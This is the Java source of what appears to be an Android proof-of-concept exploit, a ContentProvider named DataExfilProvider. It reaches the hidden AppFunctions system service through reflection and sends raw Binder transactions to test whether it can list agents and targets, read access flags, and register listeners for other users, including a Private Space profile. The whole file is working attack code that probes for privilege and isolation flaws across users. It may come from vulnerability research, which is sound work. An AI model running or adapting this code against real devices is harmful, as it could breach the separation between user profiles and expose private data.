package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class DataExfilProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        IBinder binder = getServiceBinder("app_function");
        if (binder == null) {
            cursor.addRow(new Object[]{"error", "no_binder"});
            return cursor;
        }

        String desc = "android.app.appfunctions.IAppFunctionManager";

        // TX=10: getValidAgents(int userId) -> List
        // Try with userId=0
        testGetValidAgents(binder, desc, cursor, 0);
        // Try with userId=11 (Private Space)
        testGetValidAgents(binder, desc, cursor, 11);

        // TX=11: getValidTargets(int userId) -> List
        testGetValidTargets(binder, desc, cursor, 0);
        testGetValidTargets(binder, desc, cursor, 11);

        // TX=5: getAccessFlags(String targetPkg, int targetUid, String callerPkg, int callerUid) -> int
        testGetAccessFlags(binder, desc, cursor);

        // TX=4: getAccessRequestState(String targetPkg, int targetUid, String callerPkg, int callerUid) -> int
        testGetAccessRequestState(binder, desc, cursor);

        // TX=15: addOnAccessChangedListener - register to monitor changes
        testAddListener(binder, desc, cursor);

        return cursor;
    }

    private void testGetValidAgents(IBinder binder, String desc, MatrixCursor cursor, int userId) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(userId);
            binder.transact(10, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                // Try to read List from reply
                int avail = reply.dataAvail();
                String content = readParcelContent(reply, avail);
                cursor.addRow(new Object[]{"getValidAgents_u" + userId, "SUCCESS avail=" + avail + " " + content});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"getValidAgents_u" + userId, "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getValidAgents_u" + userId, "ERR:" + e.getClass().getSimpleName() + ":" + e.getMessage()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testGetValidTargets(IBinder binder, String desc, MatrixCursor cursor, int userId) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(userId);
            binder.transact(11, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                String content = readParcelContent(reply, avail);
                cursor.addRow(new Object[]{"getValidTargets_u" + userId, "SUCCESS avail=" + avail + " " + content});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"getValidTargets_u" + userId, "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getValidTargets_u" + userId, "ERR:" + e.getClass().getSimpleName() + ":" + e.getMessage()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testGetAccessFlags(IBinder binder, String desc, MatrixCursor cursor) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // getAccessFlags(targetPkg, targetUid, callerPkg, callerUid)
            data.writeString("com.google.android.apps.messaging"); // target
            data.writeInt(10000); // targetUid
            data.writeString("com.poc.crossuser"); // caller
            data.writeInt(android.os.Process.myUid()); // callerUid
            binder.transact(5, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int flags = reply.readInt();
                cursor.addRow(new Object[]{"getAccessFlags", "SUCCESS flags=" + flags + " avail=" + reply.dataAvail()});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"getAccessFlags", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getAccessFlags", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testGetAccessRequestState(IBinder binder, String desc, MatrixCursor cursor) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString("com.google.android.apps.messaging");
            data.writeInt(10000);
            data.writeString("com.poc.crossuser");
            data.writeInt(android.os.Process.myUid());
            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int state = reply.readInt();
                cursor.addRow(new Object[]{"getAccessRequestState", "SUCCESS state=" + state + " avail=" + reply.dataAvail()});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"getAccessRequestState", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getAccessRequestState", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testAddListener(IBinder binder, String desc, MatrixCursor cursor) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // addOnAccessChangedListener(IOnAppFunctionAccessChangeListener, int userId)
            data.writeStrongBinder(new StubBinder("android.app.appfunctions.IOnAppFunctionAccessChangeListener"));
            data.writeInt(0); // userId
            binder.transact(15, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"addAccessListener_u0", "SUCCESS_REGISTERED"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"addAccessListener_u0", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"addAccessListener_u0", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Try with user 11
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeStrongBinder(new StubBinder("android.app.appfunctions.IOnAppFunctionAccessChangeListener"));
            data.writeInt(11);
            binder.transact(15, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"addAccessListener_u11", "SUCCESS_CROSS_USER!"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"addAccessListener_u11", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"addAccessListener_u11", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private String readParcelContent(Parcel reply, int maxBytes) {
        StringBuilder sb = new StringBuilder();
        int toRead = Math.min(maxBytes, 200);
        try {
            // Try reading as list
            int size = reply.readInt();
            sb.append("listSize=").append(size);
            if (size > 0 && size < 100) {
                sb.append(" [");
                for (int i = 0; i < Math.min(size, 5); i++) {
                    String s = reply.readString();
                    if (s != null) {
                        sb.append(s.substring(0, Math.min(50, s.length())));
                        if (i < size - 1) sb.append(", ");
                    }
                }
                sb.append("]");
            }
        } catch (Exception e) {
            sb.append(" readErr:").append(e.getClass().getSimpleName());
        }
        return sb.toString();
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }

    private static class StubBinder extends android.os.Binder {
        private final String descriptor;
        StubBinder(String desc) { this.descriptor = desc; attachInterface(null, desc); }
        @Override public String getInterfaceDescriptor() { return descriptor; }
        @Override protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
            if (reply != null) reply.writeNoException();
            return true;
        }
    }
}
